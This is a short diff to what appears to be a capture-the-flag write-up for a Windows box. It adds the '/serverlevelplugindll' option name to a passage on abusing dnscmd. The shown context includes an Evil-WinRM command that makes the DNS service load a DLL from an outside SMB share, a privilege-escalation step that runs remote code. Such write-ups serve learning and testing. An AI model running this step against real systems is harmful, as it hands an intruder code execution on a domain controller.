@@ -591,7 +591,7 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 ```
 
-[dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) has an option to load an external dll file.<br>
+[dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) has an option `/serverlevelplugindll` to load an external dll file.<br>
 We can take advantage of that.
 ```shell
 *Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.22\share\exploit.dll
